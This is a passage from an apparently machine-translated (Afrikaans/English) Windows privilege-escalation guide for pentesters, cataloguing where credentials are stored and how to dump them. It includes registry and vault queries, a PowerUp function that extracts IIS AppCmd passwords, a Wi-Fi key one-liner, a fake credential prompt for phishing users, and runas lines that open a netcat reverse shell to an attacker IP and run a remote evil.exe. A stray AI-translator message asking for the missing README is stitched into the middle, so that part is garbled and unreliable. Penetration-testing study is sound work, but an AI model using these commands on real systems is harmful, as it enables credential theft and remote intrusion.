net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts-lêer

Kontroleer vir ander bekende rekenaars wat in die hosts-lêer hardgekodeer is
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerk-koppelvlakke & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

Kyk vir **beperkte dienste** van buite
```bash
netstat -ano #Opened ports?
```
### Roeteringstabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

Meer[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root user kry, kan jy op enige poort luister (die eerste keer wat jy `nc.exe` gebruik om op 'n poort te luister, sal dit via die GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as root te begin, kan jy `--default-user root` probeer.

Jy kan die `WSL` lêerstelsel verken in die gids `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows-aanmeldbewyse

### Winlogon-aanmeldbewyse
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Die Windows Vault stoor gebruikerscredentials vir servers, webwerwe en ander programme wat **Windows** die gebruikers outomaties kan aanmeld. Op die eerste oogopslag lyk dit asof gebruikers hul Facebook credentials, Twitter credentials, Gmail credentials, ens. kan stoor sodat hulle outomaties via blaaiers aangemeld word. Maar dit is nie so nie.

Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

Tensy die toepassings met Credential Manager interaksie het, dink ek nie dit is moontlik vir hulle om die credentials vir ’n bepaalde bron te gebruik nie. Dus, as jou toepassing die vault wil gebruik, moet dit op een of ander manier **communicate with the credential manager and request the credentials for that resource** vanaf die standaard stoor-vault.

Gebruik die `cmdkey` om die gestoorde credentials op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` gebruik met die `/savecred` opsies om die gestoorde kredensiale te gebruik. Die volgende voorbeeld roep 'n afgeleë binêre via 'n SMB-share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik van `runas` met 'n voorsiene stel credentials.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bied 'n metode vir symmetriese enkripsie van data, hoofsaaklik gebruik binne die Windows-bedryfstelsel vir die symmetriese enkripsie van asymmetriese private sleutels. Hierdie enkripsie maak gebruik van 'n gebruiker- of stelselgeheim om aansienlik by te dra tot entropie.

**DPAPI maak die enkripsie van sleutels moontlik deur 'n symmetriese sleutel wat afgelei is van die gebruiker se aanmeldgeheime**. In scenario's wat stelsel-enkripsie behels, gebruik dit die stelsel se domeinverifikasiegeheime.

Versleutelde gebruikers-RSA-sleutels, deur DPAPI gebruik, word gestoor in die `%APPDATA%\Microsoft\Protect\{SID}` gids, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) voorstel. **Die DPAPI-sleutel, wat saam met die master-sleutel wat die gebruiker se private sleutels in dieselfde lêer beskerm, saamgeberg is**, bestaan tipies uit 64 bytes ewekansige data. (Dit is belangrik om te let dat toegang tot hierdie gids beperk is, wat voorkom dat die inhoud via die `dir` opdrag in CMD gelys kan word, alhoewel dit deur PowerShell gelys kan word).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te ontsleutel.

Die **credentials files protected by the master password** is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan die **mimikatz module** `dpapi::cred` gebruik met die toepaslike `/masterkey` om te ontsleutel.\
Jy kan **ekstrakteer baie DPAPI** **masterkeys** uit **memory** met die `sekurlsa::dpapi` module (as jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Inlogbewyse

**PowerShell-inlogbewyse** word dikwels gebruik vir **scripting** en outomatiseringstake as 'n manier om geïnkripteerde inlogbewyse gerieflik te stoor. Die inlogbewyse word beskerm deur **DPAPI**, wat gewoonlik beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar waar hulle geskep is, ontsleutel kan word.

Om 'n PS-inlogbewys uit die lêer wat dit bevat te **ontsleutel** kan jy die volgende doen:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindinge

Jy kan hulle vind op `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs uitgevoerde kommando's
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Beheerder van Remote Desktop-inlogbewyse**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Jy kan **veel DPAPI masterkeys** uit geheue uittrek met die Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Mense gebruik dikwels die StickyNotes-app op Windows-werkstasies om **wagwoorde te stoor** en ander inligting, sonder om te besef dit is 'n databasislêer. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en dit is altyd die moeite werd om daarna te soek en dit te ondersoek.

### AppCmd.exe

**Let wel dat om wagwoorde van AppCmd.exe te herstel, moet jy Administrator wees en onder 'n High Integrity level hardloop.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\` directory.\
As hierdie lêer bestaan, is dit moontlik dat sekere **credentials** gekonfigureer is en **recovered** kan word.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kontroleer of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installers word **run with SYSTEM privileges**, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Gasheer-sleutels
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private sleutels kan binne die registrasiesleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, dus behoort jy te kyk of daar iets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige inskrywing binne daardie pad vind, is dit waarskynlik 'n gestoor SSH key. Dit word versleuteld gestoor, maar kan maklik ontsleutel word met behulp van [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent` diens nie loop nie en jy wil hê dit moet outomaties op opstart begin, voer uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om 'n paar ssh keys te skep, dit by te voeg met `ssh-add` en via ssh by 'n masjien aan te meld. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` tydens die asymmetriese sleutel-authentisering geïdentifiseer nie.

### Onbewaakte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook na hierdie lêers soek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeld inhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rugsteunkopieë
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-toegangsbewyse
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek na 'n lêer genaamd **SiteList.xml**

### Gecachte GPP-wagwoord

Daar was voorheen 'n funksie beskikbaar wat die uitrol van pasgemaakte plaaslike administratorrekeninge op 'n groep masjiene via Group Policy Preferences (GPP) toegelaat het. Hierdie metode het egter beduidende sekuriteitsgebreke gehad. Eerstens kon die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is, deur enige domeingebruiker bereik word. Tweedens kon die wagwoorde binne hierdie GPPs, wat met AES256 en 'n publiek gedokumenteerde standaard sleutel geënkripteer is, deur enige geauthentiseerde gebruiker ontsleutel word. Dit het 'n ernstige risiko geskep, aangesien dit gebruikers kon toelaat om verhoogde regte te verkry.

Om hierdie risiko te beperk is 'n funksie ontwikkel om plaaslik gecachte GPP-lêers te skandeer wat 'n "cpassword" veld bevat wat nie leeg is nie. Wanneer so 'n lêer gevind word, ontsleutel die funksie die wagwoord en gee 'n pasgemaakte PowerShell-object terug. Hierdie object sluit besonderhede oor die GPP en die lêer se ligging in en help by die identifisering en hantering van hierdie sekuriteitskwessie.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor Windows Vista)_ vir hierdie lêers:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te ontsleutel:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die passwords te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Webkonfigurasie
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN inlogbewyse
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Loglêers
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir credentials

Jy kan altyd **die gebruiker vra om sy credentials in te voer of selfs die credentials van 'n ander gebruiker** as jy dink hy kan hulle ken (let wel dat dit regtig **riskant** is om die kliënt direk om die **credentials** te vra):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêername wat credentials bevat**

Bekende lêers wat 'n tyd gelede **passwords** in **clear-text** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/README.md or the proposed files to search. Please paste the README.md (or the list of files) you want translated/searched, and I'll translate the relevant English text to Afrikaans per your guidelines.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Jy moet ook die Bin nagaan om te soek na credentials daarin

Vir die **recover passwords** wat deur verskeie programme gestoor is, kan jy gebruik maak van: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Ander moontlike registry keys met credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiergeskiedenis

Jy moet soek na databasisse waarin wagwoorde van **Chrome or Firefox** gestoor word. Kontroleer ook die geskiedenis, bladmerke en gunstelinge van die blaaiers — moontlik is sommige **wagwoorde** daar gestoor.

Gereedskap om wagwoorde uit blaaiers te onttrek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is 'n tegnologie ingebou in die Windows-bedryfstelsel wat **interkommunikasie** tussen sagtewarekomponente in verskillende tale toelaat. Elke COM-komponent word **identified via a class ID (CLSID)** en elke komponent openbaar funksionaliteit via een of meer interfaces, geïdentifiseer via interface IDs (IIDs).

COM classes and interfaces word in die register gedefinieer onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** onderskeidelik. Hierdie register word geskep deur die samestelling van die **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry kan jy die child registry **InProcServer32** vind wat 'n **default value** bevat wat na 'n **DLL** wys, en 'n waarde genaamd **ThreadingModel** wat **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) of **Neutral** (Thread Neutral) kan wees.

![](<../../images/image (729).png>)

Basies, as jy die vermoë het om **overwrite any of the DLLs** wat uitgevoer gaan word, kan jy **escalate privileges** indien daardie DLL deur 'n ander gebruiker uitgevoer sal word.

Om te leer hoe aanvallers COM Hijacking as 'n persistence mechanism gebruik, kyk:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Generiese wagwoordsoektog in lêers en register**

**Soek na lêerinhalte**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n bepaalde lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek die register na sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat na passwords soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Ek het hierdie plugin geskep om outomaties elke metasploit POST-module wat na credentials binne die slagoffer soek, uit te voer.\  
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat passwords bevat wat op hierdie bladsy genoem word.\  
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende gereedskap om passwords uit 'n stelsel te onttrek.

Die gereedskap [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessions**, **usernames** en **passwords** van verskeie tools wat hierdie data in clear text stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY, en RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stel jou voor dat **'n proses wat as SYSTEM loop 'n nuwe proses open** (`OpenProcess()`) met **volle toegang**. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met lae voorregte maar wat alle oop handles van die hoofproses erven**.\
Dan, as jy **volle toegang tot die lae-voorregte proses** het, kan jy die **oop handle na die geprivilegieerde proses wat met `OpenProcess()` geskep is** gryp en **'n shellcode injekteer**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid te ontdek en te misbruik**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander pos vir 'n meer volledige verduideliking oor hoe om meer oop handles van prosesse en stringe wat geërf is met verskillende toestemmingsvlakke (nie net volle toegang) te toets en te misbruik**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheue-segmente, verwys na as **pipes**, maak proseskommunikasie en data-oordrag moontlik.

Windows bied 'n funksie genaamd **Named Pipes**, wat dit moontlik maak dat nie-verwante prosesse data deel, selfs oor verskillende netwerke. Dit lyk soos 'n client/server-argitektuur, met rolle gedefinieer as **named pipe server** en **named pipe client**.

Wanneer data deur 'n buis deur 'n **client** gestuur word, het die **server** wat die buis opgestel het die vermoë om die **identiteit** van die **client** aan te neem, mits dit die nodige **SeImpersonate** regte het. Om 'n **geprivilegieerde proses** te identifiseer wat via 'n buis kommunikeer wat jy kan naboots, bied 'n geleentheid om **hoër voorregte te verkry** deur die identiteit van daardie proses aan te neem wanneer dit met die buis wat jy opgestel het interaksie het. Vir instruksies oor hoe om so 'n aanval uit te voer, is nuttige gidse beskikbaar [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system).

Ook maak die volgende hulpmiddel dit moontlik om **'n named pipe-kommunikasie te onderskep met 'n hulpmiddel soos burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie hulpmiddel maak dit moontlik om alle pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Diverse

### Lêeruitbreidings wat dinge in Windows kan uitvoer

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### **Monitering van Command Lines vir wagwoorde**

Wanneer jy 'n shell as 'n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat uitgevoer word wat **credentials op die command line deurgee**. Die onderstaande skrip vang proses command lines elke twee sekondes op en vergelyk die huidige toestand met die vorige toestand, en gee enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Wagwoorde steel uit prosesse

## Vanaf Low Priv User na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang het tot die grafiese koppelvlak (via console of RDP) en UAC geaktiveer is, is dit in sommige weergawes van Microsoft Windows moontlik om 'n terminal of enige ander proses soos "NT\AUTHORITY SYSTEM" te laat loop vanaf 'n onbevoorregte gebruiker.

Dit maak dit moontlik om privilegies te eskaleer en UAC terselfdertyd met dieselfde kwetsbaarheid te omseil. Daarbenewens is daar geen behoefte om enigiets te installeer nie en die binary wat gedurende die proses gebruik word, is deur Microsoft onderteken en uitgegee.

